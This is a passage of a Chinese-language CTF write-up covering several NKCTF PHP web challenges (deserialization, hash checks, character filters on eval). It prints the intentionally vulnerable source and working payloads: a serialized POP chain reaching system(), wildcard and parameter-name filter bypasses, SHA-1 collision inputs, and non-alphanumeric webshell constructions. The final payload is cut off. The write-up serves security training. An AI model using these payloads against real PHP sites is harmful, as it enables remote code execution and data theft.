class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you are bad&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们仔细分析一下代码，可以得到一条pop链：<code>Welcome-&gt;Hell0-&gt;Happy</code></p><p>我们可以将Welcome类的 <code>$name=&#39;welcome_to_NKCTF&#39;</code>，<code>$args=new Hell0()</code></p><p>当Welcome类被销毁时，会调用 <code>__destruct()</code>方法，使用echo输出<code>Hell0</code>对象，调用Hell0的<code>__toString()</code>方法，当类Hell0对象的<code>$func=new Happy()</code>，我们以函数的形式调用一个对象时，会自动调用该对象的<code>__invoke()</code>方法，进而实现命令执行。</p><p>但是这里有一个<code>waf</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$string</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you are bad&quot;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>把 <code>flag*?</code>给过滤了，我们不能直接读flag，我们先构造链去获取flag的路径：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;welcome_to_NKCTF&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><span class="hljs-variable">$w</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$ha</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-variable">$he</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hell0</span>();<br><br><span class="hljs-variable">$w</span>-&gt;arg = <span class="hljs-variable">$he</span>;<br><span class="hljs-variable">$he</span>-&gt;func=<span class="hljs-variable">$ha</span>;<br><span class="hljs-variable">$ha</span>-&gt;shell=<span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$ha</span>-&gt;cmd=<span class="hljs-string">&quot;dir /&quot;</span>;    <span class="hljs-comment">//此处不能使用ls，l被过滤，我们可以使用dir</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$w</span>));<br><br>输出：<br>O%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Welcome%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A16%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>welcome_to_NKCTF%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>arg%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Hell0%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>func%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Happy%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>shell%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cmd%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>dir+%<span class="hljs-number">2</span>F%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/27/cFnZoDHg1Je7Ejh.png" alt="image-20230327141351769"></p><p>然后我们需要去读取根目录下的 <code>f1ag</code>，但是：<code>fag?*</code>被过滤了，我们怎么才能读？</p><p>我们查询到linux下还有其他的通配符：</p><p><img src="https://s2.loli.net/2023/03/27/y1zBwxnGerN3XfZ.png" alt="image-20230327141750289"></p><p>我们可以如下构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs linux">more /[^1]1[^1][^1]<br>sort /[!1]1[!1][!1]<br></code></pre></td></tr></table></figure><p>成功得到flag：</p><p><img src="https://s2.loli.net/2023/03/27/TXGqYmIZA6jFtUE.png" alt="image-20230327141849776"></p><h4 id="eazy-php"><a href="#eazy-php" class="headerlink" title="eazy_php"></a>eazy_php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>] != (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>] != <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>]) == <span class="hljs-number">114514</span>)&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NS_CTF.go&#x27;</span>]))&#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>                        &#125;<span class="hljs-keyword">else</span>&#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!!&#x27;</span>);<br>                        &#125;<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!&#x27;</span>);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!&#x27;</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!&#x27;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!&#x27;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>第一层：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br></code></pre></td></tr></table></figure><p>md5绕过，我们可以使用数组绕过：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-selector-tag">b</span><span class="hljs-selector-attr">[]</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>第二层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>] != (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))<br></code></pre></td></tr></table></figure><p>这里需要使用sha1强碰撞绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=%<span class="hljs-number">25</span>PDF-<span class="hljs-number">1.3</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">25</span>%E2%E3%CF%D3%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A1%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>obj%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>C/Width%<span class="hljs-number">202</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Height%<span class="hljs-number">203</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Type%<span class="hljs-number">204</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Subtype%<span class="hljs-number">205</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Filter%<span class="hljs-number">206</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/ColorSpace%<span class="hljs-number">207</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Length%<span class="hljs-number">208</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/BitsPerComponent%<span class="hljs-number">208</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>Astream%<span class="hljs-number">0</span>A%FF%D8%FF%FE%<span class="hljs-number">00</span>%<span class="hljs-number">24</span>SHA-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>is%<span class="hljs-number">20</span>dead%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">85</span>/%EC%<span class="hljs-number">09</span>%<span class="hljs-number">239</span>u%<span class="hljs-number">9</span>C9%B1%A1%C6%<span class="hljs-number">3</span>CL%<span class="hljs-number">97</span>%E1%FF%FE%<span class="hljs-number">01</span>%<span class="hljs-number">7</span>FF%DC%<span class="hljs-number">93</span>%A6%B6%<span class="hljs-number">7</span>E%<span class="hljs-number">01</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">02</span>%<span class="hljs-number">9</span>A%AA%<span class="hljs-number">1</span>D%B2V%<span class="hljs-number">0</span>BE%CAg%D6%<span class="hljs-number">88</span>%C7%F8K%<span class="hljs-number">8</span>CLy%<span class="hljs-number">1</span>F%E0%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>D%F6%<span class="hljs-number">14</span>%F8m%B1i%<span class="hljs-number">09</span>%<span class="hljs-number">01</span>%C5kE%C1S%<span class="hljs-number">0</span>A%FE%DF%B7%<span class="hljs-number">608</span>%E9rr/%E7%ADr%<span class="hljs-number">8</span>F%<span class="hljs-number">0</span>EI%<span class="hljs-number">04</span>%E0F%C20W%<span class="hljs-number">0</span>F%E9%D4%<span class="hljs-number">13</span>%<span class="hljs-number">98</span>%AB%E1.%F5%BC%<span class="hljs-number">94</span>%<span class="hljs-number">2</span>B%E35B%A4%<span class="hljs-number">80</span>-%<span class="hljs-number">98</span>%B5%D7%<span class="hljs-number">0</span>F%<span class="hljs-number">2</span>A3.%C3%<span class="hljs-number">7</span>F%AC5%<span class="hljs-number">14</span>%E7M%DC%<span class="hljs-number">0</span>F%<span class="hljs-number">2</span>C%C1%A8t%CD%<span class="hljs-number">0</span>Cx0Z%<span class="hljs-number">21</span>Vda0%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%<span class="hljs-number">60</span>k%D0%BF%<span class="hljs-number">3</span>F%<span class="hljs-number">98</span>%CD%A8%<span class="hljs-number">04</span>F%<span class="hljs-number">29</span>%A1&amp;d=%<span class="hljs-number">25</span>PDF-<span class="hljs-number">1.3</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">25</span>%E2%E3%CF%D3%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A1%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>obj%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>C/Width%<span class="hljs-number">202</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Height%<span class="hljs-number">203</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Type%<span class="hljs-number">204</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Subtype%<span class="hljs-number">205</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Filter%<span class="hljs-number">206</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/ColorSpace%<span class="hljs-number">207</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Length%<span class="hljs-number">208</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/BitsPerComponent%<span class="hljs-number">208</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>Astream%<span class="hljs-number">0</span>A%FF%D8%FF%FE%<span class="hljs-number">00</span>%<span class="hljs-number">24</span>SHA-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>is%<span class="hljs-number">20</span>dead%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">85</span>/%EC%<span class="hljs-number">09</span>%<span class="hljs-number">239</span>u%<span class="hljs-number">9</span>C9%B1%A1%C6%<span class="hljs-number">3</span>CL%<span class="hljs-number">97</span>%E1%FF%FE%<span class="hljs-number">01</span>sF%DC%<span class="hljs-number">91</span>f%B6%<span class="hljs-number">7</span>E%<span class="hljs-number">11</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">02</span>%<span class="hljs-number">9</span>A%B6%<span class="hljs-number">21</span>%B2V%<span class="hljs-number">0</span>F%F9%CAg%CC%A8%C7%F8%<span class="hljs-number">5</span>B%A8Ly%<span class="hljs-number">03</span>%<span class="hljs-number">0</span>C%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>D%E2%<span class="hljs-number">18</span>%F8m%B3%A9%<span class="hljs-number">09</span>%<span class="hljs-number">01</span>%D5%DFE%C1O%<span class="hljs-number">26</span>%FE%DF%B3%DC8%E9j%C2/%E7%BDr%<span class="hljs-number">8</span>F%<span class="hljs-number">0</span>EE%BC%E0F%D2%<span class="hljs-number">3</span>CW%<span class="hljs-number">0</span>F%EB%<span class="hljs-number">14</span>%<span class="hljs-number">13</span>%<span class="hljs-number">98</span>%BBU.%F5%A0%A8%<span class="hljs-number">2</span>B%E31%FE%A4%<span class="hljs-number">807</span>%B8%B5%D7%<span class="hljs-number">1</span>F%<span class="hljs-number">0E3</span>.%DF%<span class="hljs-number">93</span>%AC5%<span class="hljs-number">00</span>%EBM%DC%<span class="hljs-number">0</span>D%EC%C1%A8dy%<span class="hljs-number">0</span>Cx%<span class="hljs-number">2</span>Cv%<span class="hljs-number">21</span>V%<span class="hljs-number">60</span>%DD0%<span class="hljs-number">97</span>%<span class="hljs-number">91</span>%D0k%D0%AF%<span class="hljs-number">3</span>F%<span class="hljs-number">98</span>%CD%A4%BCF%<span class="hljs-number">29</span>%B1<br></code></pre></td></tr></table></figure><p>第三层：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>] != <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>]) == <span class="hljs-number">114514</span>)<br></code></pre></td></tr></table></figure><p><code>intval()</code>函数 用于获取变量的整数值，如果我们传入一个小数，会被转化为整数，但是php小数与整数又不相等，所以我们可以使用小数绕过</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">e</span><span class="hljs-operator">=</span><span class="hljs-number">114514.1</span><br></code></pre></td></tr></table></figure><p>第四层：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NS_CTF.go&#x27;</span>]))<br></code></pre></td></tr></table></figure><p>php中如果参数中出现非法字符，会被替换为下滑线<code>_</code>，如果出现<code>[</code>，也会被替换为下划线<code>_</code>，但是这将导致后面的非法字符不被转换（php&lt;8）</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/115050295">php非法参数转换</a></p><p>例如：我们传入</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">?<span class="hljs-keyword">NS</span>[CTF.go<br></code></pre></td></tr></table></figure><p>由于<code>[</code>被转为下划线<code>_</code>，并导致后面的非法字符不转换，所以实际传入的变量名为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?N</span>S_CTF.go<br></code></pre></td></tr></table></figure><p>第五、六层：非字母数字webshell，我们使用取反<code>~</code>绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;(~&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$func</span>).<span class="hljs-string">&quot;)&quot;</span>.<span class="hljs-string">&quot;(~&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$cmd</span>).<span class="hljs-string">&quot;);&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/27/d7Z5e2OMhAu6EJ4.png" alt="image-20230327144832948"></p><p>读到flag在根目录，然后使用tac查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tac</span> /flag<br></code></pre></td></tr></table></figure><p>得到flag</p><h4 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// not only ++</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$NK</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$NK</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$NK</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$NK</span>) &lt; <span class="hljs-number">105</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$NK</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;hacker!!!&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了好多</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$NK</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$NK</span>) &lt; <span class="hljs-number">105</span>)&#123;<br></code></pre></td></tr></table></figure><p>不能使用<code>异或、取反、或</code>好像可以使用自增，但是限制了长度，可以读些简单的东西</p><p>这是根据ctfshow rce极限挑战改编的</p><p><a href="https://blog.csdn.net/m0_64815693/article/details/127951989">ctfshowRCE极限挑战</a></p><p>我们先读一下phpinfo()，可以传数组 <code>NKCTF[]=1</code> 绕过 <code>is_string()</code></p><p><img src="https://s2.loli.net/2023/03/27/tsfo63xB9JdQkyH.png" alt="image-20230327150652441"></p><p>我们使用如下payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">NKCTF=<span class="hljs-variable">$_</span>=(_/_._)[_];<span class="hljs-variable">$_</span>%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B;$%FA=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B;<span class="hljs-variable">$_</span>%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B;<span class="hljs-variable">$_</span>%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B;<span class="hljs-variable">$_</span>=_.$%FA.%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B<span class="hljs-variable">$_</span>.%<span 